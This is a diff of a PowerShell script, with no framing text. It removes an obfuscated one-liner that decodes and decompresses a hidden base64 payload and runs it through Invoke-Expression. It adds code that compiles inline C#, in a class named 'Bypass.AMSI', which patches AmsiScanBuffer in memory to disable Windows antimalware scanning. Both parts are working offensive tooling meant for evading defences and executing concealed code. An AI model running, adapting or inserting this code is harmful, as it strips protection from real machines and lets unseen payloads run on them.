@@ -1,2 +1,50 @@
-  SEt-ItEM  ("v"+"ARIABlE"+":ELtH8a") ([TYPe]("{1}{0}"-f'ErT','CoNV') ) ;  $q6ZX2 =  [TypE]("{0}{1}{4}{2}{3}{5}"-F'Io.c','omPREsSI','coMpRE','SsioNM','ON.','ODe');  $3QY6 =[tyPE]("{3}{4}{1}{0}{2}"-f 'o','m.TeXt.ENC','dIng','SyS','te') ;  (.("{0}{3}{2}{1}" -f 'Ne','cT','oBJe','W-')  ("{2}{3}{0}{1}"-f'strEAMreAde','R','io','.')( ( .("{2}{1}{0}"-f'cT','BJe','NeW-o') ("{7}{1}{3}{5}{2}{4}{6}{0}" -f 'M','o.cOm','EflA','PRESsI','Testre','on.D','A','SysTEm.I')( [sYstem.io.memoRYsTreAM] $ElTh8a::("{1}{0}{4}{2}{3}"-f'm','fRO','AsE','64STRING','b').Invoke( ("{30}{13}{43}{18}{1}{82}{4}{56}{40}{70}{39}{27}{20}{60}{36}{38}{16}{32}{66}{11}{76}{17}{81}{87}{71}{65}{89}{58}{52}{6}{59}{3}{12}{42}{62}{90}{5}{34}{48}{33}{8}{41}{37}{80}{88}{35}{10}{0}{24}{75}{84}{31}{45}{15}{67}{86}{19}{57}{9}{51}{79}{73}{44}{74}{61}{14}{53}{29}{85}{7}{50}{68}{69}{78}{25}{83}{26}{2}{54}{64}{63}{22}{28}{47}{46}{55}{72}{23}{77}{21}{49}"-f 'O','cDy+vvx7+fHX399/ulzu6Y5e0Q939PU','AxnQF/z/nuJsWuh9l8svNi7xJMKokki6hchezkxwXXUjM1N6S2sCoa3a8c2SV4yMSSKuldncePL','tdaGA0y5udiT+RsYG5Ct5tCwp','5JExfKTQjnHDvo0LWw7bVvj2bbw6hZT0MWpFZuJ7Em6Medy4yaU45g2Ux41p','UE2EM6h24+ZIlkTJRAaI13088BRMD','cxfKV5xmJSO7JQUD6A74lkCp4hTCLQz8+IqR+YHSdTpleaIlnCr42','ufGLpa9u59Evq','tQpVJQQ+sCWo2QFOwpmuEvsIjuAsr2cOpi','kTYF/eguBDrJc7Cgdqgk0x2n','kGi5uBmjvWK','WmSqW+','IReUS','NixxHDP0rwgRmF1dCdXd','oH2X2DhUdGClxNRklwD0Q+iX3amsY96Evrj8jdsOq6m5bnTLg32EKLizG2lLc9tlRKOLnUipB71','IlDl0umyZIEv','4wuHie3u1iDlldGzBRVNcyhg2sYsVOEngDpVCA5Py+zVEzSX','OW9K+sp9Bj6jPmgytgfxGgEyjIRiez7hEJuoIg6i318GQedzSlIrZgTF83J1EMWaqOGBTlF8ZGNN','7ZenT2+e7h+2','goKaSFWPYSouxge0QBiE2FxCdNG8Q5Ql43z','F1Wz3FjTRwQcPGo71JMG3nZEEji5oHzY3SoI0HOQKbIpskZPIxZ3zgqPFrfIscU7ZL48','wD4/h3T6/u6T','8V0Nf1kj63pgji5/','b8WpCtezFkRZsZhV','4o','1/57ESmcHLfBYAKG','ebwc2IpWPTKnC91zHhhTgE7e2PK1K04Qmk3acbloAqCAElS0QdAR6VyCr8fllt9','w','QSEftHX6b7Tv3s8ruyU/t158EcBQ+HQuu0HVMC5hj6dazwc8upBcUQxhNXlVuSfXK3psGS8Ki6Yh+hNaGxOIrIRuZICZ70bEmSIW2FUJBrmJajtSbwL3bgbj/IKBucC+Q4csWj2c30DXCFkpSs/h','9p1ARCDYhFyTvFeKS0sv5GdZYWqypF0+K','jVl','snMpxLdMvKgd77KR92tyhMylxyyqFO6EsasIWrWpSaCv4SJt6uaDgUTBHu6I+aWjDLCG0GkvDanX','bKY4eR0z','Mx10dDLJOTSvnSTyqCjeL8Vgu31T9kjlP5JF','sRn','oQheYATdClMHPzpvX9mNBGZTY6RMWFWwc1eR','60v0MIt7L8RTw','Z','KyTpM4tGhiaw','2/SQunzHMmzg8Mq2NUzTu0cqI34zfHprJtxrPtEA5t3DNcMX5FtSFJSqzvboITgyrUQOs','wJ+MoRcgppfMxjhbwFNlE3NWzKha8PByV1lDiUv7RjfN7Z7Zv4qOCh4VJxTNvVB3w/m0XqSx6VnbHTKgd','bVOmoJALpZN','l0YI','9HoOxg3NIgp3bspfAhpxssI3Jz09JelJVz+xCsGd2pqu7qiQ9PT3V/HRHdw8fv315/9svjz98f/rw1+ePb//48PTu','YVhFkvT22c3S3NpReAaU','WaxAjNxVDiAsdKXppQwCvfbK','Shl8','Y6Xx2shygrMz9zOGFe+hWLtk66C8QVAjDK2zdqENN1mUbpvdx3coktERJvnFJBxM7w8qs','ML2SEjBOazWi/1WOqOYr8FhBUFA6xF','8=','sv5pbt1KJlZIi4nwCSM9N','Li0O37l','W','ZTHLYi4','49UHDbrpFmVhfH0bSU6','ZIVOtzPYGl2HCQ7yowg4t0+n','PJ3aeCAV+cvfKbUx0VhqrFsqP1TH03yTLDbeq7wn3a3MtcnmZO8+XgIv3uVh2RnP2KLcEKjLhGNkbGx866FmGDJMa7JpmSxWvaxL8Fq9hTzuJX7rYzQPf4','0uJRz0','L7WGKR7VMdqgODbFlcny3Axdyq3R7vEQGuGp14d','ZKlqAxWhSCQ9eihCANjESwvyQ','uBpLGdgzcdEs/B/zllhktlRew8mTcFa4oWdYSgL/Fe5WYxW7aeA+w/8IyDgeD4JaBRQNbDBhDbHARs+CSEHH15lmQJj','SyYdVZU','GBWAZGzEEtGKVhPgQD8bTDcFJxWp+RiqqIesmEtevS3tTKIDlL/ULCMNUQsQYSJzEJsZskLBUAekLOy527LpAz6zKy6U51Vr3UphJbg+25','yod9QAW9N70wnJ8wU9bW6ptuB1oNCX8bCJW8/fZlD130Ge9Irq','C4zrEXpW9CCx4NXodbLbKZucIBzWVnD6KUFvKKOLIgLlWR5qE11PpCwsi','hMTMpipDw6PaM1YMWA5ENx0uc','7f5Fl5RDEH6DhyxrCu0oQiZLLxJivmUCv7EMbHINPptPIaS9ILa+IWe6IPlDddRt6q7LXPr','sOI','uHpL5S0fgnX0It','e+v8r/cGWAnUasokwu9','lOBbj','VfkcON6UlBYNhwZAaVj','RQgH626yGaywPDcg8zhDTNLfdLCQFLDrfekixdAkjL','qx','8oBrFgh5fu','OGBxYHzl7xNxul8XylwKHHmFg7ONMW','TEEJg+K7kGY1hBcE58j2Uhtf67S50+d','ybP1D7sm2GFR+iaOtp02nf59Ti/CQaukIanOWg7JHuX+sPjG+/0eXz3/','3hdATewsyYpn+10z7q','bXxJPTcM1KFYYz+svlExLJdHK3NyVZZRMZpM1nHXz8NOpUgvSrdh','uYjnhF4oTHioemmujlEOSGn4xL5rBPB1Cn3wnfGg9hFIXpZwp+T1XUVngDYzl3ssq8XVE7N59a6Tp5givehI','oy3BgyuP7UwymQsesLqNFbTBw1I4CZZ+r5jZzcpq1YKk8WOuCNfeVP0HsVPgiW','70eXzu68Xulzo/tXrh49/fuA5Ht788/OXh8dHujsKBWr7eNviRmGL4+MxXmXjv4FS','yfpjYirUZKcyUX+RvWIJs8heVxMXTSLSZq2tRdAkqWcj','0UGknlOM0tSb4YSWRUGJeS8FtSn57Z+4V','GnPKCiLZHwGOS','i','HGPC8crdI+Du9j9kgBgooIKCo75nYwAD2zNgQFptOcbGYxg','Lyc8ayUcUW','0OXYL4','SLJn76pL86iJ12244qM2pqBtvubuEBsVgJW+zSSi9gqc07SpZZYVEO2wJ')),   (  varIaBle  ('Q6Z'+'X2')  -vaL)::"DE`cOmpR`eSs" ) ) ,  $3QY6::"as`cii") ).("{3}{2}{0}{1}" -f 'DToE','ND','a','RE').Invoke()| .( ${p`sh`OMe}[4]+${P`ShoMe}[34]+'X')
+$Ref   =  (  
+( 'Sys' + ("{1}{0}"-f'em,','t' )  +(  "{1}{0}" -f'i',' Vers' )  + ("{0}{1}"-f'on','=4.')  +  '0.0'  + ("{2}{3}{4}{1}{0}"-f 're=neutra','ultu','.0',', ','C'  ) +  'l, '+'P'+ 'ub'+'li'  + 'c' +("{1}{0}" -f'eyToke','K')+  'n'  + ( "{1}{0}"-f'a5c','=b77'  )  + '56' +  (  "{2}{0}{1}" -f '8','9','1934e0' )),
+( ("{2}{1}{0}"-f 'unt','em.R','Syst')  +'i'  + 'me.'+  'In'+  'ter'+  'o'  +'p'  + (  "{1}{0}" -f'vi','Ser') +  'ces' +( "{1}{3}{5}{4}{2}{6}{0}" -f 'u',', Ve','0,','rsion=','0.0.','4.',' C' )+  ("{2}{1}{3}{0}"-f 'utr','re=n','ltu','e'  ) +  'al,'  +(  "{0}{1}" -f' Pu','bl')  + ( "{1}{0}{2}" -f 'cKeyTo','i','ke'  )  + 'n=b'+(  "{2}{1}{0}" -f'5f7f','f','03') +("{2}{0}{1}" -f '50','a3a','11d') )
+  )
+
+$Source = @"
+using System;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    public class AMSI
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        public static int Disable()
+        {
+            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            if (TargetDLL == IntPtr.Zero) { return 1; }
+
+            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            if (ASBPtr == IntPtr.Zero) { return 1; }
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+
+            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
+
+            Byte[] Patch = { 0x31, 0xff, 0x90 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
+
+            return 0;
+        }
+    }
+}
+"@
+
+Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
+
 
